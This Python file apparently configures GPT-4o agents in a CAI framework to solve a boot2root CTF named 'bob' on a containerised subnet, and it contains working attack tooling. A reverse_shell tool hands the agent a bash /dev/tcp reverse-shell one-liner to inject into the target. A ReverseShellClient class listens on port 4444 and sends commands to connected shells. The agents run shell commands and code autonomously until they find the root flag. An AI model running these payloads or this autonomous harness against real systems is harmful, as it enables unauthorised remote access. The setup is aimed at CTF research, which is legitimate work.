"""
Advanced Boot2Root CTF Framework with CLI, Code Interpreter and Analysis Modes
"""
from cai import CAI, Agent
import pentestperf as ptt

# Codebase Tools
from cai.tools.llm_plugins.code_interpreter import execute_python_code
from cai.tools.llm_plugins.cli_utils import execute_cli_command
from cai.tools.web.headers import web_request_framework
from cai.tools.llm_plugins.reasoning import thought
# Prompts
cli_agent_system_prompt = open(
    "cai/prompts/system_cli_pentest_expert.txt").read()
thought_agent_system_prompt = open(
    "cai/prompts/system_thought_router.txt").read()
env_context = open("cai/prompts/ctx/env_context.txt").read()
exploit_agent_system_prompt = open(
    "cai/prompts/system_exploit_expert.txt").read()

client = CAI()

# Init CTF environment
ctf = ptt.ctf(
    "bob",
    subnet="192.168.2.0/24",
    container_name="bob",
    ip_address="192.168.2.11"
)
ctf.start_ctf()

def reverse_shell(host, port: int = 4444):
    """
    Creates a reverse shell command using bash
    Args:
        host: Target host IP
        port: Target port number by default use 4444
    Returns:
        str: Bash reverse shell command
    """
    return f"Use this reverse shell into the correct attack vector/param in target: bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"

import socket
import threading
import sys

class ReverseShellClient:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.running = False
        self.listener_thread = None
        self.command_history = []
        self.client_socket = None

    def handle_client(self, client_socket):
        self.client_socket = client_socket
        while True:
            try:
                data = client_socket.recv(4096)
                if not data:
                    break
                decoded_data = data.decode()
                self.command_history.append(decoded_data)
                sys.stdout.write(decoded_data)
                sys.stdout.flush()
            except:
                break
        client_socket.close()
        self.client_socket = None

    def start_listener(self):
        self.running = True
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(1)
            while self.running:
                client, addr = self.socket.accept()
                client_handler = threading.Thread(
                    target=self.handle_client,
                    args=(client,)
                )
                client_handler.daemon = True
                client_handler.start()
        except Exception as e:
            print(f"Error in listener: {str(e)}")
        finally:
            self.socket.close()

    def start(self):
        """Start the reverse shell listener"""
        self.listener_thread = threading.Thread(target=self.start_listener)
        self.listener_thread.daemon = True
        self.listener_thread.start()
        return {"status": "Listener started", "host": self.host, "port": self.port}

    def stop(self):
        """Stop the reverse shell listener"""
        self.running = False
        if self.client_socket:
            self.client_socket.close()
        self.socket.close()
        return {"status": "Listener stopped"}

    def send_command(self, command: str):
        """
        Send a command to the connected reverse shell
        Args:
            command: Command to execute on target
        Returns:
            dict: Status of command execution
        """
        if not self.client_socket:
            return {"status": "error", "message": "No client connected"}
        try:
            self.client_socket.send(f"{command}\n".encode())
            return {"status": "success", "message": "Command sent"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def get_history(self):
        """Get command history and output"""
        return {"history": self.command_history}

reverse_client = ReverseShellClient()
reverse_client.start()


def Code_Executor_Expert():
    """
    Code Executor Expert, call this function empty Code_Executor_Expert() to transfer to code_agent
    """
    return code_agent


def CliAgent():
    """
    CLI Security Tester, call this function empty CliAgent() to transfer to cli_agent
    """
    return cli_agent


def Thought_Agent():
    """
    Thought Agent, call this function empty Thought_Agent() to transfer to thought_agent
    """
    return thought_agent


# Thought Process Agent for analysis and planning
thought_agent = Agent(
    name="ThoughAgent",
    instructions=thought_agent_system_prompt + env_context,
    functions=[thought, CliAgent, Code_Executor_Expert],
    model="gpt-4o",
    parallel_tool_calls=False
)


cli_agent = Agent(
    name="Boot2Root CTF Tester",
    instructions=cli_agent_system_prompt + env_context,
    functions=[
        execute_cli_command,
        Thought_Agent,
        Code_Executor_Expert,
        execute_python_code,
        reverse_shell,
        reverse_client.send_command,
        reverse_client.get_history,
        reverse_client.stop,
        reverse_client.start],
    parallel_tool_calls=False,
    model="gpt-4o"
)

code_agent = Agent(
    name="Boot2Root Exploit Developer",
    instructions=exploit_agent_system_prompt + env_context,
    functions=[execute_python_code, CliAgent, Thought_Agent],
    model="gpt-4o",
    parallel_tool_calls=False
)


messages = [{
    "role": "user",
    "content": f"""CTF description: Name Bob Target: {ctf.get_ip()},
    this is a boot2root CTF challenge
    ITERATE UNTIL YOU FIND ROOT FLAG"""
}]

thought_response = client.run(
    agent=thought_agent,
    messages=messages,
    debug=True)
ctf.stop_ctf()
